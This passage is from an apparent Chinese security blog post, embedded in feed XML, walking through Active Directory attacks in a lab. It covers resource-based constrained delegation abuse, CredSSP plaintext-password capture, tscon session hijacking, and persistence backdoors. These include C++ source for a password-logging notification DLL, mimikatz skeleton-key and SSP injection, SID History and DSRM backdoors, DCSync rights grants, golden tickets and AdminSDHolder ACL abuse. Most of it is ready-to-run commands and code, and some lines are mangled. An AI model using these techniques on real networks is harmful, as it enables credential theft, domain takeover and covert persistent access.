基于资源的约束性委派。</p><p>我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png" alt="QQ截图20210217135833"></p><p>可以获得域控WIN版本</p><p>然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。<br>直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png" alt="QQ截图20210217135859"></p><p>我们依旧使用powerview。先调用<br><code>Get-DomainUser -Identity username -Properties objectsid</code>来获取当前用户SID<br>然后<code>Get-DomainObjectAcl -Identity 主机名 | ?&#123;$_.SecurityIdentifier -match &quot;刚刚得到的SID&quot;&#125;</code> 查看当前用户对某台主机是否有写权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png" alt="QQ截图20210217140628"></p><p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。<br>如图看到我们对WIN7进行操作</p><p>好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png" alt="QQ截图20210217140659"></p><p>好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值 ，这个操作我们用powerview实现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  </span><br><span class="line">#这儿的sid是我们创建的#机器用户#evilsystem的sid</span><br><span class="line">$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png" alt="QQ截图20210217140726"></p><p>至于机器账户SID怎么获得，powerview下的 <code>get-domiancomputer hacksystem</code><br>然后使用<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> 查看委派是否设置成功</p><p><code>Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose </code>此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值</p><p>现在都统统设置好了，开始下一步吧。<br>网上一般用的rubeus，这里我用kekeo吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx</span><br></pre></td></tr></table></figure><p>本地运算出机器用户ntlm hash 这里借用一下别人的图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png" alt="QQ截图20210217140944"></p><p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> 写入票据</p><p>然后我在本机使用以上方法后klist一下，发现确实存在票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png" alt="QQ截图20210217140737"></p><p>但是dir \test1\c$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了</p><h4 id="敏感用户不可委派的绕过"><a href="#敏感用户不可委派的绕过" class="headerlink" title="敏感用户不可委派的绕过"></a>敏感用户不可委派的绕过</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png" alt="QQ截图20210217141050"></p><p>若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。</p><p>我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>继续实验administrator，发现确实是这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png" alt="QQ截图20210217141131"></p><p>此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png" alt="QQ截图20210217141313"></p><p>可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具<br><a href="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a><br>但实际上rubeus也能完成票据修改<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png" alt="QQ截图20210217141325"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png" alt="QQ截图20210217141339"></p><p>完事</p><h2 id="credssp-导出用户明文密码"><a href="#credssp-导出用户明文密码" class="headerlink" title="credssp 导出用户明文密码"></a>credssp 导出用户明文密码</h2><p>CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器。 通常运用于远程桌面服务。</p><p>我们在配置这个协议时，一般在组策略编辑器里配置。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143231.png" alt="QQ截图20210217143231"></p><p>Allow delegating default credentials表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p><p>Allow delegating default credentials with NTLM-only server authentication表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据，即明文密码。</p><p>这几个属性在注册表里对应 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>那么这样看，这个攻击流程就很自然了。<br>我们要获得两台机器，一台机器当作远程桌面的服务器，一台当作远程桌面的客户端。<br>在客户端上配置组策略（CREDSSP），使其在远程桌面身份验证时发送明文密码。<br>然后开始远程桌面验证，在服务器上获得客户端发来的明文密码.</p><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>1.通过修改注册表，改变组策略身份验证的凭据策略(选一个），这一步需要管理员权限，本地或域管</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefaultCredentials &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v AllowDefCredentialsWhenNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefault &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation &#x2F;v ConcatenateDefaults_AllowDefNTLMOnly &#x2F;t REG_DWORD &#x2F;d 1</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br><span class="line"></span><br><span class="line">reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly &#x2F;v 1 &#x2F;t REG_SZ &#x2F;d *</span><br></pre></td></tr></table></figure><p>一股脑设置好就完事了。。（用户需重新登陆才生效）</p><p>然后开始获取密码</p><p>我们刚刚提到需要两台电脑才能获取密码，其实那只是一个模型，一个机器既可以当作客户端又可以当作服务端的。<br>我们用kekeo实现攻击（本机向本机获取密码时，普通用户即可完成以下操作）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tsssp::server 开启服务端</span><br><span class="line">tsssp::client &#x2F;target:...   开启客户端，这里的target随便填</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143306.png" alt="QQ截图20210217143306"></p><p>那么再回到需要两个机器，一个当服务端一个当客户端的情况吧。</p><p>服务端建立: tsssp::server 需要SYSTEM权限</p><p>客户端链接: tsssp::client /target:服务端的SPN（一般采用TERMSRV服务） /pipe: \服务端域名\pipe\kekeo_tsssp_endpoint 普通用户权限即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143322.png" alt="QQ截图20210217143322"></p><h2 id="tscon横向"><a href="#tscon横向" class="headerlink" title="tscon横向"></a>tscon横向</h2><p>若一个机器上有多个用户登录，则在任务管理器可以看见如下场面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143439.png" alt="QQ截图20210217143439"></p><p>其中，我们可以右键其他用户选择链接，输入其密码后就能进入其桌面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143500.png" alt="QQ截图20210217143500"></p><p>但是对于system用户来说，要链接到其他用户是不需要输入密码的，可以直接连接。所以我们可以通过system权限获取登录在当前机器上的域用户权限。<br>比如上图中的administrator是域管，我有当前机器的system权限，那么我可以直接用以下命令完成用户权限获得。</p><p>query user 获得administrator用户的id</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143547.png" alt="QQ截图20210217143547"></p><p>可以发现admin的id是2，那么我们就可以用tscon这个windows自带的命令行工具完成权限获得。</p><p>cmd /k tscon 2 /dest:console</p><p>执行以上命令，我们跳转到了admin的桌面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143616.png" alt="QQ截图20210217143616"></p><h1 id="域管权限维持"><a href="#域管权限维持" class="headerlink" title="域管权限维持"></a>域管权限维持</h1><h2 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h2><p>原理：当用户修改密码时会输入明文密码，LSA会调用PasswordChangeNotify 在系统中同步密码。我们HOOK这个函数，改变其行为，就能达到获取用户修改后的密码的明文.</p><p>Tool: Powersploit下的Invoke-ReflectivePEInjection.ps1 （用于注入）<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>以及 <a href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a> 的HookPasswordChange.dll(需自行编译)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure><p>执行如上命令，只要修改了用户的密码，修改后的明文密码就会记录在 C:\Windows\Temp\passwords.txt 文件中。</p><p>下面我们分析一下原理</p><p>当密码改变请求发生时，LSA会调用Password Filters。每一个password filter会先验证新密码的合法性和复杂度，然后LSA会发出请求已更改的信号。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133057.png" alt="QQ截图20210217133057"></p><p>该过程由 password notification DLL 完成。所以我们只需要劫持这个DLL，把它换成我们自定义的DLL即可达到目的。<br>这种方式一般在Server服务器上利用率较高<br>通常来说，这个dll文件的在注册表中的路径是 hklm\system\currentcontrolset\control\lsa的 notification packages表项。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133116.png" alt="QQ截图20210217133116"></p><p>我们要利用该方法，首先要确保密码策略已启用</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133138.png" alt="QQ截图20210217133138"></p><p>至于命令行怎么修改。可以这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">secedit &#x2F;export &#x2F;cfg gp.inf &#x2F;quiet   将组策略导出为文件</span><br><span class="line">在该文件里将PasswordComplexity项值修改为1</span><br><span class="line">然后用secedit &#x2F;configure &#x2F;db gp.sdb &#x2F;cfg gp.inf &#x2F;quiet 将其导入数据库</span><br><span class="line">刷新组策略： gpupdate&#x2F;force</span><br><span class="line">重启后生效</span><br></pre></td></tr></table></figure><p>下面我们构造dll文件去覆盖它。</p><p>首先我们的dll文件内容如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;NTSecAPI.h&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() &#123;</span><br><span class="line">OutputDebugString(L&quot;InitializeChangeNotify&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(</span><br><span class="line">PUNICODE_STRING AccountName,</span><br><span class="line">PUNICODE_STRING FullName,</span><br><span class="line">PUNICODE_STRING Password,</span><br><span class="line">BOOLEAN SetOperation)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugString(L&quot;PasswordFilter&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify(</span><br><span class="line">PUNICODE_STRING UserName,</span><br><span class="line">ULONG RelativeId,</span><br><span class="line">PUNICODE_STRING NewPassword)</span><br><span class="line">&#123;</span><br><span class="line">FILE *pFile;</span><br><span class="line">fopen_s(&amp;pFile, &quot;C:\\logFile.txt&quot;, &quot;a+&quot;);</span><br><span class="line">fprintf(pFile, &quot;%ws:%ws&quot;, UserName-&gt;Buffer, NewPassword-&gt;Buffer);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把这个dll文件放入system32文件，然后修改注册表，使 hklm\system\currentcontrolset\control\lsa的 notification packages表项包括我们的恶意dll文件，具体命令行操作如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLMSYSTEMCurrentControlSetControlLsa&quot; &#x2F;v &quot;Notification Packages&quot; &#x2F;t REG_MULTI_SZ &#x2F;d &quot;evildll&quot; &#x2F;f</span><br></pre></td></tr></table></figure><p>重启后生效。无奈的是我把dll文件写出来了且确保是正确的，在win7和win2012上复现均失败，网上成功的例子是win2008server，可惜我并没有这个版本的虚拟机不过原理倒是懂了</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>运用mimkatz可以在域控机上对所有用户添加一个统一密码用来登录.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimikatz# misc::skeleton</span><br></pre></td></tr></table></figure><p>然后所有用户都能用密码 mimiaktz登陆了</p><h2 id="SSP注入"><a href="#SSP注入" class="headerlink" title="SSP注入"></a>SSP注入</h2><p>ssp:一个DLL文件，用来实现Windows身份验证功能，比如kerberos，ntlm。系统启动时SSP会被自动加载入lsass.exe<br>sspi:SSP的API接口</p><p>如果我们自定义个恶意dll文件让他在系统启动时自动加载到lsass.exe,就能得到进程中的明文密码</p><p>临时性注入(重启便失效)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimiaktz# misc::memssp</span><br></pre></td></tr></table></figure><p>执行如上命令, 然后只要目标机器不重启，在目标机器上登录的用户名和密码将会被记录在 C:\Windows\System32\mimilsa.log 文件中。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133322.png" alt="QQ截图20210217133322"></p><p>长期性注入（重启不失效）</p><p>把 mimikatz中的mimilib.dll放到系统的C:\Windows\System32\ 目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果。</p><p>修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，加载新的DLL文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133335.png" alt="QQ截图20210217133335"></p><p>用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log</p><h2 id="SID-History后门"><a href="#SID-History后门" class="headerlink" title="SID History后门"></a>SID History后门</h2><p>sid history:当我们把域A的用户x迁移到域B时，B域中x的sid会发生改变，随即而来的是权限也会发生改变。所以为了避免这种权限改变，sid history诞生了， 系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源 。</p><p>在域控上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add &#x2F;sam:const27 &#x2F;new:administrator 将administrator的SID添加到const27的sid history属性</span><br></pre></td></tr></table></figure><p>然后可以在域控上验证其sid history是否更改成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module activedirectory</span><br><span class="line">Get-ADUser const27 -Properties sidhistory</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133438.png" alt="QQ截图20210217133438"></p><p>可以发现现在是有SIDHistory属性了。而且末尾的500预示着ADMIN权限</p><h2 id="DSRM后门"><a href="#DSRM后门" class="headerlink" title="DSRM后门"></a>DSRM后门</h2><p>DSRM账号:每个域控上都有一个本地管理员账户也就是DSRM账户，用于在域环境出现故障时本地登录进行修复.可以利用这个账户进行持久化操作。（ 如果域控制器的系统版本为Windows Server 2003，则不能使用该方法进行持久化操作。 ）</p><p>我们先设置DSRM密码<br>域控上输入ntdsutil<br>然后输入reset password on server null<br>然后键入密码，最后按q退出即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133606.png" alt="QQ截图20210217133606"></p><p>在mimikatz中dump本地hash可以看到多出来个Administrator</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133631.png" alt="QQ截图20210217133631"></p><p>然后设置DSRM登陆方式<br>DSRM登陆方式有三种分别对应123.</p><ul><li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li><li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li><li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li></ul><p>我们需要将他改成2才行。powershell执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure><p>即可.然后直接psexec登录(这里用的是cs)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133652.png" alt="QQ截图20210217133652"></p><p>注意填Realm时要填上面dump出sam时的域名（这里是DC）</p><h2 id="委派后门"><a href="#委派后门" class="headerlink" title="委派后门"></a>委派后门</h2><p>这个很简单，利用约束性委派或者基于资源的约束性委派攻击得到的ST2保存起来，或者非约束性委派得到的TGT，要用的时候加载进内存就行了</p><h2 id="DCSYNC"><a href="#DCSYNC" class="headerlink" title="DCSYNC"></a>DCSYNC</h2><p>这个东西 可以实现不登录到域控而获取域控上的数据<br>获得以下权限就可以使用了</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>然后在mimikatz里<br>privilege::debug<br>lsadump::dcsync /user:xxxx /domain:xxxxx /csv 即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133813.png" alt="QQ截图20210217133813"></p><p>然后我们就可以通过krbtgt hash制作黄金票据登录administrator。<br>如果还想隐蔽一点，可以给普通用户添加如下ACE,使其获得dcsync权限</p><ul><li></li><li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li></ul><p>可以以管理员权限运行powerview.ps1完成以上操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#给域用户hack添加以上三条ACE</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br><span class="line"> </span><br><span class="line">#给域用户hack删除以上三条ACE</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>然后普通用户也可以用mimikatz调用dcsync导出hash了</p><h3 id="配合EXCHANGE用户达到域提权目的"><a href="#配合EXCHANGE用户达到域提权目的" class="headerlink" title="配合EXCHANGE用户达到域提权目的"></a>配合EXCHANGE用户达到域提权目的</h3><p>前提:一个exchange高权限组的用户控制权，一个机器账户</p><p>exchange安装后会在AD上生成两个容器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141602.png" alt="QQ截图20210217141602"></p><p>其中exchange windows permissions组的用户拥有writeDACL权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承writedacl权限，有这个权限后就能使用dcsync导出所有用户hash。<br>其中exchange trusted subsystem组甚至可能有继承自administrators组的权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141614.png" alt="QQ截图20210217141614"></p><p>假设我们已经拿到了exchange trusted subsystem中一个用户的控制权。<br>那么就可用dysync进行权限维持了</p><h2 id="黄金票据生成"><a href="#黄金票据生成" class="headerlink" title="黄金票据生成"></a>黄金票据生成</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#提权</span><br><span class="line">privilege::debug</span><br><span class="line"> </span><br><span class="line">#生成黄金票据并导入</span><br><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:const.com &#x2F;sid:当前用户sid去掉最后一个数据 &#x2F;krbtgt:krbtgt的hash &#x2F;ptt</span><br></pre></td></tr></table></figure><h2 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h2><p>AdminSDHolder是一个特殊容器，用作受保护用户或组的ACM模板。AD定期把 AdminSDHolder对象的ACL 应用到所有受保护用户或组上，防止其被有意或故意修改。 如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法 。</p><p>如何寻找受保护用户或组：</p><p>受保护用户或组的 <strong>AdminCount属性为1</strong> 。 但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组 。</p><p>使用powerview.ps1<code>Get-NetUser -AdminCount</code>即可获得受保护用户<br><code>Get-NetGroup -AdminCount</code>即可获得受保护组</p><p>如何修改ADMINSDHOLDER的ACL</p><p>域管执行以下命令(powerview.ps1)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;CONST,DC&#x3D;COM&quot; -PrincipalIdentity xx -Verbose -Rights ALL</span><br><span class="line">给AdminSDHoloder添加一条ACL,让xx用户获得完全控制权</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133841.png" alt="QQ截图20210217133841"></p><p>然后默认等60分钟，待ADMINSDHOLDER生效后，xx就获得所有受保护对象的完全控制权了<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133909.png" alt="QQ截图20210217133909"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;横向移动&quot;&gt;&lt;a href=&quot;#横向移动&quot; class=&quot;headerlink&quot; title=&quot;横向移动&quot;&gt;&lt;/a&gt;横向移动&lt;/h1&gt;&lt;h2 id=&quot;PTH&quot;&gt;&lt;a href=&quot;#PTH&quot; class=&quot;headerlink&quot; title=&quot;PTH&quot;&gt;&lt;/a&gt;PT</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透信息搜集命令总汇</title>
    <link href="http://yoursite.com/2021/02/19/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/"/>
    <id>http://yoursite.com/2021/02/19/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/</id>
    <published>2021-02-19T09:21:53.672Z</published>
    <updated>2021-02-19T08:50:55.067Z</updated>
    
